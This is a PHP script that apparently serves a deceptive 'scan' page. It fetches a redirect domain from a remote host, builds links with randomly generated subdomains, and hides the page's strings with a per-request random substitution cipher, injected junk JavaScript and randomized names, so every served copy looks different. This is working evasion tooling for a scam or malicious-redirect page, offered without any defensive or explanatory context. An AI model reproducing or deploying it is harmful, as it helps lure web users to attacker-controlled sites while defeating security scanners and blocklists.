<?php
	error_reporting(E_ALL);
	function getSite(){
    $ch = curl_init();
  	curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
  	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  	$site = curl_exec($ch);
  	curl_close($ch);
  	return $site;
  }
  
	function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }

  function random($length = 10) {
      $characters = 'abcdefghijklmnopqrstuvwxyz';
      $randomString = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, strlen($characters) - 1)];
      }
      return $randomString;
  }

  function encode($metin,$kripto,$alfabe,$charlen){
    $sifreli = "";
    $metin = random($charlen).$metin;
    for($i=0;$i<strlen($metin);$i++){
      if(strpos($alfabe,$metin[$i]) !== false){
        $sifreli .= $kripto[$i%count($kripto)][strpos($alfabe,$metin[$i])];
      }else{
        $sifreli .= $metin[$i];
      }
    }
    return $sifreli;
  }

  function getrandomkripto(){
    $alfabe = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789:/.=?_";
    $k = str_shuffle($alfabe);
    return $k;
  }
  $html = file_get_contents("scan.html");

  $kripto = array();
  for($i=0;$i<rand(4,10);$i++){
    $kripto[] = getrandomkripto(); 
  }
  $alfabe = getrandomkripto();

  require_once("jsGenerate.php");
  $jsGenerate = new js();
  $randomscript = $jsGenerate->createCode();

  $id = @$_GET["id"];
  if(empty($id) || $id == "" || $id == "/"){
    $id = generate_name(rand(5,10));
  }
  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
  
  $app_site = getSite();
  $redirectlink = 'http://'.generate_name(rand(5,8)).'.'.$app_site.'/'.$id;

  $variables = array(
    "kriptoarray" => json_encode($kripto),
    "alfabestr" => $alfabe,
    "redirectlink" => $redirectlink,
    "randomscript" => $randomscript
  );

  foreach ($variables as $key => $value) {
    $html = str_replace("{".$key."}", $value, $html);
  }

  while(strpos($html, "{random}") !== false){
    $html = str_replace_first("{random}", random(rand(5,6)), $html);
  }

  preg_match_all("/{decode}\(\"(.*?)\"\)/", $html, $encodes);
  $encodes = $encodes[0];
  foreach ($encodes as $encoded) {
    preg_match("/{decode}\(\"(.*)\"\)/", $encoded, $variable);
    $charlen = rand(1,15);
    $bool = rand(1,2) == 1 ? "true":"false";
    $html = str_replace($encoded, '{decode}("'.encode($variable[1],$kripto,$alfabe,$charlen).'",'.$charlen.','.$bool.')', $html);
  }

  $html = str_replace("{decode}", random(rand(5,8)), $html);

  $variables = array();
  preg_match_all("/{(.*?)}/", $html, $variables);
  $variables = $variables[0];
  foreach ($variables as $key) {
    $html = str_replace($key, random(rand(5,6)), $html);
  }

  echo $html;
?>
